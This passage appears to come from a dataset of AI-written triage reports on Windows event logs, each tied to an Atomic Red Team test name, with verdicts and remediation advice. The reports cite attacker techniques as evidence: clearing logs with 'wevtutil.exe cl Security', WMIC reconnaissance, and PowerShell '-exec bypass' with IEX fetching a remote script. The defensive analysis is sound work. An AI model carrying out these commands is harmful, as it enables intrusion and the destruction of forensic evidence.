   - Conduct security awareness training to ensure users recognize and report suspicious activity. 

5. **Audit and Update:**
   - Ensure all systems and software are updated to mitigate exploitation of known vulnerabilities.
   - Review and audit the privileged accounts and ensure least privilege principle is applied effectively. 

The observations and recommended actions outlined should help mitigate the risk identified and prevent potential future occurrences."
WMI Reconnaissance List Remote Services,"Upon analyzing the provided Windows event logs, there are a few key points of interest that suggest suspicious activity:

1. **Event Log Clearing**:
   - **Security Log ID 1102** (Event log cleared): The log entry indicates the security log was cleared by the user `admin_test` at `15:05:40.9919337`. Clearing event logs, particularly security logs, is often an attempt to cover tracks and can indicate malicious activity.
   - **System Log ID 104**: The System event log was cleared at `15:05:40.9448644` and the Windows PowerShell log at `15:05:41.0461209`, both by the same user `admin_test`. Similar to the security log clearing, this activity can suggest an attempt to hide actions taken on the system.

2. **Privilege Granted**:
   - **Security Log ID 4672** (Special Privileges Assigned): The user `admin_test` received extensive special privileges, such as `SeDebugPrivilege`, which can allow an attacker to debug or manipulate system processes and is a commonly exploited privilege in attacks.

3. **Time Manipulation**:
   - **Security Log ID 4616** (System Time Change): There are entries indicating the system time was changed back and forth. Manipulating system time can interfere with the timing of logs and system events, often used to mislead ""last modified"" timestamps or to circumvent time-based security controls.

4. **Process Execution Activity**:
   - Multiple executions of `wevtutil.exe` are noted in the Sysmon logs. This utility is used to manage and clear Event Viewer logs. The command lines executed match those required to clear logs (e.g., `wevtutil.exe cl Security`), indicative of the clear intention to remove event logs.

5. **Command Execution**:
   - **Sysmon Log ID 17963**: `cmd.exe` was used to execute a WMIC command targeting the spooler service on the local node. While this in isolation may not be malicious, it’s unusual in normal system operations and, combined with other suspicious activity, could be part of data gathering or pre-exploitation reconnaissance (spooler service has had critical vulnerabilities in the past).

6. **Enumeration of System Information**:
   - Execution of utilities like `whoami.exe` and `hostname.exe` could suggest reconnaissance activity to gather information about the system and user context.

**Assessment**:
The collection and correlation of these logs strongly indicate malicious intent. The clearing of important logs, granting numerous privileges to a user account, system time manipulation, and the series of command executions are commonly associated with activities intending to compromise or exploit a system.

**Resolution**: MALICIOUS

**Guidance**:
1. Investigate and verify the credibility of user `admin_test`. Check whether these actions were authorized or accidental under an administrative task.
2. Inspect `SERVER002` for indicators of compromise (IoC), specifically focusing on any unauthorized changes, data exfiltration, or unusual network activity.
3. Review and tighten security policies, ensuring all privileged actions are logged, and unauthorized privilege escalation attempts are alerted.
4. Reinstate security monitoring and alerts promptly, and ensure all systems, including the CEO’s machine, are scanned and devoid of potential backdoors or malware.
5. Conduct a review of active directory, focusing on logs and user privilege assignments for any inconsistencies.
6. Consider reeducating staff on security procedures if this action was by an insider.
"
WMI Reconnaissance Users,"Upon reviewing the Windows event logs, several activities stand out as potentially suspicious:

1. **Log File Clearance (Security Event ID 1102 and System Event ID 104):**
   - The security logs indicate that the event log was cleared by the user `admin_test`.
   - System and Windows PowerShell logs were also cleared. Clearing logs is often an attempt to cover tracks and should be treated as highly suspicious unless there is an administrative reason provided.

2. **Privilege Use (Security Event ID 4672):**
   - The user `admin_test` was granted special privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and several others that could be used in privilege escalation and other malicious actions. While these could be legitimate actions taken by an administrator, when combined with log file clearance, they suggest a potential misuse of privileges.

3. **Unusual Process Execution:**
   - Several instances of `wevtutil.exe` are used to clear logs (as seen in Sysmon Event ID 1) by the user `admin_test`, operating with high integrity. This activity supports the finding of clearing logs, which is a red flag in this context.
   - `cmd.exe` is executed with `WMIC` (Sysmon Event ID 17963) to list all user accounts, an action commonly associated with reconnaissance performed during a security compromise.

4. **Time Manipulation (System Event ID 1):**
   - The logs show changes to system time. While this could be benign, when aligned with other behavior like log clearance, it can indicate attempts to obscure timelines.

5. **Reconnaissance Activities:**
   - Execution of `whoami.exe` (Sysmon Event ID 17959) and querying user accounts via `WMIC` (as described above) align with typical reconnaissance activities that adversaries perform to gather system and user information.

6. **Unusual Network Access:**
   - Login sessions from `DESKTOP-3HL5B2P` using NTLM over IPv6 addresses suggest that there might be remote access or lateral movement involved. The originating address may need correlation with known business operations or further investigation.

Given these activities, which are characteristic of a potential compromise involving both covering tracks and conducting reconnaissance, the overall findings indicate that there is possible malicious intent. The combination of privilege elevation, log clearance, and reconnaissance commands executed by an administrator account are strong indicators of malicious activity.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Actions:**
  - Isolate the affected system (`Server002`) from the network to prevent further potential malicious actions.
  - Change credentials and enforce a password reset for the `admin_test` account and other affected accounts.
  
- **Further Investigation:**
  - Review network logs and conduct forensic analysis on `Server002` to search for indicators of lateral movement or further compromise.
  - Investigate `DESKTOP-3HL5B2P` and the associated IP addresses to verify if the access was legitimate or unauthorized.
  
- **Preventive Measures:**
  - Implement stricter monitoring and alerting for event log clearance attempts and privilege escalations.
  - Conduct a full audit of the account privileges and enforce the principle of least privilege to all accounts, especially those with administrative access.

- **Consulting Incident Response:**
  - Engage the incident response team to handle the situation with expertise and to ensure comprehensive containment and remediation steps."
Command Prompt read contents from CMD file and execute,"## Detailed Analysis of Provided Windows Event Logs:

### Observations:
1. **Event Log Clearing**:
   - The events in both Security and System logs (Event IDs 1102 and 104) indicate that logs were cleared by the user `admin_test`.
   - The use of `wevtutil.exe` with the `cl` (clear log) command was observed in the Sysmon logs. This tool is typically used to manage event logs on Windows and clearing logs can be an attempt to cover tracks.

2. **User Activity**:
   - The user account involved in these actions is `SERVER002\admin_test`.
   - This same account executed numerous processes in a short timespan with high integrity, likely indicating admin-level privileges.

3. **Processes Involved**:
   - There were repeated instances of PowerShell (`powershell.exe`), and command shells (`cmd.exe`) being spawned within the event timeline.
   - A specific command line of note involves `cmd.exe` pointing to a script from a directory under `AtomicRedTeam`, a known repository for adversary simulation, indicating potentially harmless testing or a simulation run.

4. **Suspicious Command Execution**:
   - The appearance of the `calc.exe` execution via `cmd.exe` is unusual within this context and might indicate testing of direct execution, a common technique used for red teaming.

5. **Microsoft Edge Update Processes**:
   - There are several instances of legitimate Microsoft Edge update processes executing with the `NT AUTHORITY\SYSTEM` user. This doesn't appear related to the suspicious activity but is notable due to volume and timings within the log.

### Assessment:
- **Log Clearing**: The clearing of logs, especially under the account of an admin, is highly concerning and suspicious, particularly without any known maintenance justifications.
- **Rapid Specific Process Execution**: The use of `cmd.exe`, PowerShell, and the direct execution of `calc.exe` is indicative of potentially malicious automation or simulated red team exercises.
- **Known Test Directories**: The references to `AtomicRedTeam` suggest this could be a controlled testing situation. However, without explicit confirmation, this activity should be treated as potentially suspicious.

### Conclusion on Logs:
Due to the combination of log clearing, admin user involvement, and the type of executions logged, the activity is labeled as **SUSPICIOUS**. It warrants further investigation, particularly:
- Verify with the IT/admin team if they recently conducted any testing or red teaming, particularly using AtomicRedTeam scripts.
- Investigate the timeline and justification for this account clearing logs.
- Conduct interviews or checks on the person or system responsible (admin_test) for any intended maintenance or testing rationale.

### Recommended Actions:
1. **Immediate Review**: Contact relevant administrators to determine if this was an intended and legitimate activity.
2. **Audit Trails**: Ensure there are separate logging mechanisms to capture such actions in the future where possible.
3. **User Access Review**: Examine the `admin_test` account for any other unusual activities or access, verifying account control legitimacy and preventive measures against misuse. 
4. **Increase Monitoring**: Place the system under increased surveillance for any continuations of this behavior and readiness for incident response if deemed necessary."
Powershell MsXml COM object - with prompt,"Based on the analysis of the provided Windows event logs, several indicators suggest the presence of potentially malicious activity on the system:

1. **Log Clearing Activities**: Multiple entries in the Security and System logs indicate that logs were cleared. For example, EventID 1102 in the Security log and EventID 104 in the System log show that the ""admin_test"" user cleared various logs, including Security, System, and Windows PowerShell logs, using the `wevtutil.exe` command. Log clearing is a technique often used by attackers to cover their tracks.

2. **Time Manipulation**: The System log shows changes in system time (EventID 4616). These changes can indicate attempts to manipulate the timeline of events on the system, which is a known tactic to confuse forensic analysis.

3. **Suspicious PowerShell Activity**: The PowerShell logs reveal execution with the `-exec bypass` flag and the use of `IEX` (Invoke-Expression), which was initiated by a script fetched from a URL (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1`). This is a common pattern for executing potentially harmful PowerShell scripts from remote sources.

4. **Use of System Utilities**: The Sysmon logs show the use of `cmd.exe` to invoke a PowerShell script from a potentially suspicious source, exhibiting behavior consistent with malicious intent. The use of legitimate system utilities for malicious purposes is known as Living-off-the-Land Binaries (LOLBins) strategy.

5. **Repeated Use of `wevtutil.exe`**: The `wevtutil.exe` process was spawned multiple times to clear different types of logs. Such activities, especially executed under an admin account, are highly suspicious and indicative of an attempt to erase any traces of the attacker's activities.

In light of these findings, it is assessed that these logs contain significant indicators of compromise and malicious activity. The behaviors observed are consistent with actions one might take to establish persistence, execute remote code, and cover tracks on a compromised system.

### Resolution: MALICIOUS

**Guidance on How to Proceed:**
- **Immediate Containment**: Disconnect the affected system (Server002) from the network to prevent further unauthorized access or damage.
- **Forensic Analysis**: Conduct a thorough forensic investigation on the system, focusing on the execution timeline and any potential lateral movement.
- **Threat Hunting**: Expand the investigation to other systems within the network for similar indicators, as this might be part of a broader campaign.
- **Review Security Policies**: Re-evaluate and strengthen security policies, especially concerning admin access, logging, and monitoring configurations to prevent similar incidents in the future.
- **User Awareness Training**: Reinforce user training regarding the dangers of opening unknown scripts, especially from the internet.

Taking these steps will help in mitigating risk and restoring security posture effectively."
